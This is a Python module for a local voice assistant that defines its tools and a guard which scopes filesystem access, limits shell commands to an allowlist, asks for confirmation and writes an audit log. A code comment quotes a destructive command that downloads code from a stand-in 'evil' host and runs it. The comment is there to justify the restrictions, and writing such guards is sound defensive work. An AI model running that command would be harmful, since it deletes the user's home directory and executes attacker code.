"""The local tool registry and the confirmation/audit-log guard that
enforces the safety rules on every call — filesystem scoping, spoken/typed
confirmation for destructive actions, and a full audit log to
~/Library/Logs/jarvis.log.

This replaces the Claude Agent SDK's PreToolUse/PostToolUse hooks from the
Anthropic-brain version: since we now own the entire tool-calling loop
(src/brain/agent.py), there's no SDK permission system to hook into —
`ToolGuard.check()` is called directly by the loop before every tool
executes, and `ToolGuard.log()` after.
"""

from __future__ import annotations

import json
import logging
import os
import shlex
import subprocess
from collections.abc import Callable
from datetime import datetime, timezone
from pathlib import Path

from src.brain.browser_tools import build_browser_tools
from src.brain.memory import memory_dispatch
from src.brain.memory_db import MemoryDB
from src.brain.tool_types import Tool
from src.brain.web_search import web_search
from src.system.config import Config
from src.system.redaction import redact_secrets, rotating_handler

ConfirmFn = Callable[[str, str, dict], bool]  # (description, tool_name, input) -> confirmed?

LOG_DIR = Path.home() / "Library" / "Logs"
LOG_PATH = LOG_DIR / "jarvis.log"
TOOL_CALLS_PATH = LOG_DIR / "jarvis_tool_calls.jsonl"
_logger = logging.getLogger("jarvis.tools")


def _ensure_logging() -> None:
    if _logger.handlers:
        return
    handler = rotating_handler(LOG_PATH)  # redacts + rotates
    handler.setFormatter(logging.Formatter("%(asctime)s %(message)s"))
    _logger.addHandler(handler)
    _logger.setLevel(logging.INFO)
    _logger.propagate = False


def _path_in_allowlist(path_str: str, allowlist: list[Path]) -> bool:
    try:
        resolved = Path(path_str).expanduser().resolve()
    except (OSError, RuntimeError):
        return False
    return any(resolved == root or root in resolved.parents for root in allowlist)


def _make_read_file(allowlist: list[Path]) -> Callable[[dict], str]:
    def read_file(tool_input: dict) -> str:
        path = Path(tool_input["path"]).expanduser()
        if not _path_in_allowlist(str(path), allowlist):
            return f"Error: {path} is outside the allowed directories {[str(p) for p in allowlist]}."
        resolved = path.resolve()
        if not resolved.exists():
            return f"Error: {resolved} does not exist."
        if resolved.is_dir():
            return "\n".join(sorted(p.name for p in resolved.iterdir()))
        return resolved.read_text(errors="replace")[:8000]

    return read_file


def _make_write_file(allowlist: list[Path]) -> Callable[[dict], str]:
    def write_file(tool_input: dict) -> str:
        path = Path(tool_input["path"]).expanduser()
        if not _path_in_allowlist(str(path), allowlist):
            return f"Error: {path} is outside the allowed directories {[str(p) for p in allowlist]}."
        resolved = path.resolve()
        resolved.parent.mkdir(parents=True, exist_ok=True)
        content = tool_input.get("content", "")
        resolved.write_text(content)
        return f"Wrote {len(content)} characters to {resolved}"

    return write_file


# run_shell executes ONE program from this allowlist with plain arguments,
# via shell=False. There is no shell involved, so a model-emitted
# `rm -rf ~ ; curl evil | sh` cannot chain, pipe, redirect, glob, or
# command-substitute — those tokens are rejected outright below, and even
# if they weren't, they would be passed as literal argv strings, never
# interpreted. Widen this set deliberately, never with a wildcard.
_SHELL_ALLOWED_EXECUTABLES = frozenset({
    "ls", "cat", "echo", "pwd", "head", "tail", "wc", "grep", "find",
    "git", "python", "python3", "pip", "pip3", "date", "whoami", "uname",
    "sort", "uniq", "diff", "which",
})

# Shell metacharacters that only make sense with a real shell. We never use
# one, but rejecting them gives the model a clear error instead of a
# baffling "no such file or directory" when it tries to pipe.
_SHELL_FORBIDDEN_TOKENS = ("`", "$(", "${", ">", "<", "|", "&", ";", "\n", "\r")


def _run_shell(tool_input: dict) -> str:
    raw = tool_input.get("command", "")
    if not isinstance(raw, str) or not raw.strip():
        return "Error: empty command."

    for token in _SHELL_FORBIDDEN_TOKENS:
        if token in raw:
            return (
                f"Error: '{token}' is not allowed. run_shell runs a single program "
                "with plain arguments — no pipes, redirection, chaining, or command "
                "substitution. Run one command at a time."
            )

    try:
        argv = shlex.split(raw)
    except ValueError as e:
        return f"Error: could not parse command ({e})."
    if not argv:
        return "Error: empty command."

    executable = os.path.basename(argv[0])
    if executable not in _SHELL_ALLOWED_EXECUTABLES:
        return (
            f"Error: '{executable}' is not on the allowed-command list. "
            f"Allowed: {sorted(_SHELL_ALLOWED_EXECUTABLES)}."
        )

    project_root = Path(__file__).resolve().parents[2]
    # Do not leak the parent process's environment (which has loaded .env
    # secrets) into a model-directed subprocess.
    safe_env = {
        "PATH": os.environ.get("PATH", "/usr/bin:/bin:/usr/local/bin"),
        "HOME": str(Path.home()),
        "LANG": os.environ.get("LANG", "en_US.UTF-8"),
    }
    try:
        result = subprocess.run(
            argv,
            shell=False,
            cwd=str(project_root),
            capture_output=True,
            text=True,
            timeout=30,
            env=safe_env,
        )
    except subprocess.TimeoutExpired:
        return "Error: command timed out after 30 seconds"
    except FileNotFoundError:
        return f"Error: '{executable}' is not installed."
    output = (result.stdout + result.stderr).strip()
    return output[:4000] if output else "(no output)"


def _web_search(tool_input: dict) -> str:
    return web_search(tool_input["query"])


def _memory(tool_input: dict) -> str:
    return memory_dispatch(tool_input)


_memory_db: MemoryDB | None = None


def _get_memory_db() -> MemoryDB:
    global _memory_db
    if _memory_db is None:
        _memory_db = MemoryDB()
    return _memory_db


def _remember(tool_input: dict) -> str:
    content = str(tool_input.get("content", "")).strip()
    if not content:
        return "Error: nothing to remember."
    fact_id = _get_memory_db().remember(content, source="user")
    return f"Remembered (fact #{fact_id})."


def _recall(tool_input: dict) -> str:
    facts = _get_memory_db().search(str(tool_input.get("query", "")), limit=8)
    if not facts:
        return "No matching memories."
    return "\n".join(f"- {f.content}" for f in facts)


def build_tools(cfg: Config) -> dict[str, Tool]:
    allowlist = cfg.resolved_filesystem_allowlist()

    tools: dict[str, Tool] = {
        "memory": Tool(
            name="memory",
            description=(
                "Store/retrieve facts across conversations under /memories. commands: "
                "view (path, optional view_range), create (path, file_text), "
                "str_replace (path, old_str, optional new_str), "
                "insert (path, insert_line, insert_text), delete (path), "
                "rename (old_path, new_path)."
            ),
            parameters={
                "command": "one of view|create|str_replace|insert|delete|rename",
                "path": "string, e.g. /memories/preferences.md",
                "file_text": "string, for create",
                "old_str": "string, for str_replace", "new_str": "string, optional for str_replace",
                "insert_line": "integer, for insert", "insert_text": "string, for insert",
                "old_path": "string, for rename", "new_path": "string, for rename",
            },
            handler=_memory,
        ),
        "read_file": Tool(
            name="read_file",
            description="Read a text file, or list a directory, inside the allowed directories.",
            parameters={"path": "string, absolute or ~-relative path"},
            handler=_make_read_file(allowlist),
        ),
        "write_file": Tool(
            name="write_file",
            description="Create or overwrite a text file inside the allowed directories.",
            parameters={"path": "string", "content": "string"},
            handler=_make_write_file(allowlist),
            confirm_key="Write",
        ),
        "run_shell": Tool(
            name="run_shell",
            description=(
                "Run ONE allowed program with plain arguments in the project "
                "directory (no pipes/redirection/chaining). 30s timeout. Allowed "
                "programs: ls, cat, echo, pwd, head, tail, wc, grep, find, git, "
                "python, pip, date, whoami, uname, sort, uniq, diff, which."
            ),
            parameters={"command": "string, e.g. 'git status' or 'grep -r TODO src'"},
            handler=_run_shell,
            confirm_key="run_shell_command",
        ),
        "web_search": Tool(
            name="web_search",
            description="Search the web and return the top results (title, url, snippet).",
            parameters={"query": "string"},
            handler=_web_search,
        ),
        "remember": Tool(
            name="remember",
            description=(
                "Save a durable fact about the user to structured long-term memory "
                "(survives restarts). Use for stable preferences and facts the user "
                "asks you to remember."
            ),
            parameters={"content": "string, the fact to store"},
            handler=_remember,
        ),
        "recall": Tool(
            name="recall",
            description="Search long-term memory for facts about the user.",
            parameters={"query": "string, what to look up"},
            handler=_recall,
        ),
    }

    tools.update(build_browser_tools())
    return tools


def _redact_input(tool_input: dict) -> dict:
    """Redact secrets from each string value of a tool input, per-value so a
    regex can never consume a JSON delimiter and corrupt the record."""
    redacted: dict = {}
    for key, value in tool_input.items():
        redacted[key] = redact_secrets(value) if isinstance(value, str) else value
    return redacted


class ToolGuard:
    """Confirmation gate + audit log, applied by src/brain/agent.py's tool
    loop before/after every tool call."""

    def __init__(self, cfg: Config, confirm_fn: ConfirmFn):
        self.cfg = cfg
        self.confirm_fn = confirm_fn
        _ensure_logging()

    def check(self, tool: Tool, tool_input: dict) -> tuple[bool, str]:
        """Returns (allowed, reason_if_denied)."""
        if tool.confirm_key and tool.confirm_key in self.cfg.require_confirmation_for:
            description = self._describe(tool, tool_input)
            if not self.confirm_fn(description, tool.name, tool_input):
                _logger.info("DENY tool=%s input=%s reason=not-confirmed", tool.name, tool_input)
                return False, "User did not say 'confirm'."

        if tool.name == "memory" and tool_input.get("command") == "delete":
            if "delete_file" in self.cfg.require_confirmation_for:
                description = f"delete memory file {tool_input.get('path')}"
                if not self.confirm_fn(description, tool.name, tool_input):
                    _logger.info("DENY tool=memory input=%s reason=not-confirmed", tool_input)
                    return False, "User did not say 'confirm'."

        return True, ""

    @staticmethod
    def _describe(tool: Tool, tool_input: dict) -> str:
        if tool.name == "write_file":
            return f"write to {tool_input.get('path', 'a file')}"
        if tool.name == "run_shell":
            return f"run this command: {tool_input.get('command', '')}"
        if tool.name.startswith("browser_"):
            action = tool.name[len("browser_"):]
            detail = tool_input.get("url") or tool_input.get("text") or tool_input.get("element") or ""
            return f"perform a browser {action} action" + (f" ({detail})" if detail else "")
        return f"use {tool.name}"

    def log(self, tool_name: str, tool_input: dict, result: str) -> None:
        _logger.info("TOOL_CALL tool=%s input=%s result=%s", tool_name, tool_input, str(result)[:500])

        TOOL_CALLS_PATH.parent.mkdir(parents=True, exist_ok=True)
        entry = {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "tool": tool_name,
            "input": _redact_input(tool_input),
            "result": redact_secrets(str(result))[:500],
        }
        with open(TOOL_CALLS_PATH, "a") as f:
            f.write(json.dumps(entry, default=str) + "\n")
